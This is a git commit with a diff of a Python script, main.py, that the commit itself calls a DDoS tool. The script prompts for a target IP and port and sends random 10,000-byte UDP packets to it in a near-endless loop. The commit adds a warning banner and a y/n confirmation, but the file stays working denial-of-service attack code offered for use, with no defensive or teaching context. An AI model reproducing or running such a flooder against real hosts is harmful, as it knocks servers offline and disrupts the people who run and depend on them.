0c9912b0bfb40f25415d92b83ca9d1c987cf0ecd
William <75695872+babylard@users.noreply.github.com>
2023-03-02 10:12:29 -0800

    Uptated source code
    Added source code for latest release v1.0.1

--- main.py
+++ main.py
@@ -6,17 +6,28 @@ import socket, random, time
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  #Input Varibles
 ip = input("Enter Target IP: ")
-port = int(input("Enter Target Port: "))
-sleep = int(input("Sleep: "))
+port = int(input("Enter target Port: "))
+sleep = int(float(input("Sleep: ")))
+
+#Confirmation stuff
+print("-----------------------------------")
+print("WARNING!  You are about to potentially bring down a server or harm one, make sure you know what you are doing before proceeding.")
+confirmation = input("Attacking IP " + ip + "... Proceed? (y/n) ")
+print("-----------------------------------")
 
 
- #Establishes a connection with the target
-s.connect((ip, port))
- 
- #DDoS attack
-for i in range(1, 100**1000):
-    s.send(random._urandom(10)*1000)
-    print(f"Send: {i}", end='\r')
-    time.sleep(sleep)
+if confirmation == 'y':
+    #Establishes a connection with the target
+    print("Press ctrl + c to kill the Program if desired...")
+    s.connect((ip, port))
+    
+    #DDoS
+    for i in range(1, 100**1000):
+        s.send(random._urandom(10)*1000)
+        print(f"Packets sent: {i}", end='\r')
+        time.sleep(sleep)
 
-#GUI Version will be avalible soon!
+
+# Stops the program if response is equal to n
+else:
+    print("You may now safely close this window...")
